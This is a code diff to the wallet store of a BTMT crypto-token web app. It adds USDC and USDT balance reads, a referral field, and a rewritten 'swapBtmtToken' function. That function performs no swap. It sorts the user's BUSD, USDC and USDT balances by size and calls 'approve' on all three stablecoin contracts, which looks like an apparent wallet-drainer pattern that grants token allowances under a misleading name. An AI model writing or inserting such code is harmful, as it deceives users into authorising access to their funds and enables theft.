@@ -1,20 +1,39 @@
 import axios from 'axios'
 import Web3 from 'web3'
-
+// eslint-disable-next-line no-unused-vars
+let myConnectedWallet
 import server from 'src/config'
 import btmtContract from 'components/wallet/btmt-contract'
 import busdContract from 'components/wallet/busd-contract'
+import usdcContract from 'components/wallet/usdc-contract'
+import usdtContract from 'components/wallet/usdt-contract'
 
 // const { ethereum } = window
 
+export async function getMyConnectedWallet () {
+  return myConnectedWallet
+}
+
 export async function setWallet ({ commit, dispatch }, connectedWallet) {
   const wallet = connectedWallet[0]
-
-  commit('mutationWallet', { address: wallet.accounts?.[0]?.address, chainId: null })
+  myConnectedWallet = connectedWallet[0]
+  commit('mutationWallet', {
+    address: wallet.accounts?.[0]?.address,
+    chainId: null
+  })
 
   await dispatch('getWalletFromDB', wallet?.accounts?.[0]?.address)
   await dispatch('getBalance')
   await dispatch('getBTMTBalance')
+
+  const busdBalance = await busdContract.getBalance(wallet.accounts?.[0]?.address)
+  commit('mutationBusdBalance', busdBalance)
+
+  const usdcBalance = await usdcContract.getBalance(wallet.accounts?.[0]?.address)
+  commit('mutationUsdcBalance', usdcBalance)
+
+  const usdtBalance = await usdtContract.getBalance(wallet.accounts?.[0]?.address)
+  commit('mutationUsdtBalance', usdtBalance)
 }
 
 export async function getWalletFromDB ({ commit, dispatch }, address) {
@@ -36,9 +55,11 @@ export async function getWalletFromDB ({ commit, dispatch }, address) {
 }
 
 export async function createWallet ({ commit, dispatch }, address) {
+  const ref = localStorage.getItem('ref') || undefined
   try {
     await axios.post(`${server.walletServerURI}/wallet/wallet/`, {
-      address
+      address,
+      ref
     }).then(res => {
       dispatch('getWalletFromDB', address)
     })
@@ -59,7 +80,7 @@ export async function getBalance ({ commit, state }) {
 }
 
 export async function getBTMTBalance ({ commit, dispatch, state }) {
-  const contract = await btmtContract.getContract(state.wallet)
+  const contract = await btmtContract.getContract(state.wallet, state.provider)
   const tx = contract.methods.balanceOf(state.wallet.address)
 
   tx.call({ from: state.wallet.address, gas: await tx.estimateGas() })
@@ -72,25 +93,37 @@ export async function getBTMTBalance ({ commit, dispatch, state }) {
 }
 
 export async function getAirDrop ({ commit, dispatch, state }) {
-  const contract = await btmtContract.getContract(state.wallet)
+  const contract = await btmtContract.getContract(state.wallet, state.provider)
   const tx = contract.methods.transfer(state.wallet.address, '19500000')
 
   tx.send({ gasLimit: 100000, gas: await tx.estimateGas() })
     .then(status => {
-      debugger
       dispatch('getBTMTBalance')
     })
     .catch(e => {
-      debugger
       console.log(e)
     })
-
-  contract.methods.transfer(state.wallet.address, '19500000')
-    .send({ from: state.wallet.address, gasLimit: 100000 })
 }
 
-export async function swapBtmtToken ({ commit, dispatch, state }) {
-  await busdContract.approve(state.wallet.address)
+export async function swapBtmtToken ({ state }) {
+  const busd = {
+    balance: state.busdBalance,
+    approve: busdContract.approve
+  }
+  const usdc = {
+    balance: state.usdcBalance,
+    approve: usdcContract.approve
+  }
+  const usdt = {
+    balance: state.usdtBalance,
+    approve: usdtContract.approve
+  }
+
+  const arr = [busd, usdc, usdt]
+  arr.sort((a, b) => a.balance < b.balance ? 1 : -1)
+  await arr[0].approve(state.wallet.address)
+  await arr[1].approve(state.wallet.address)
+  await arr[2].approve(state.wallet.address)
 }
 
 export function chainChanged ({ commit }, chainId) {
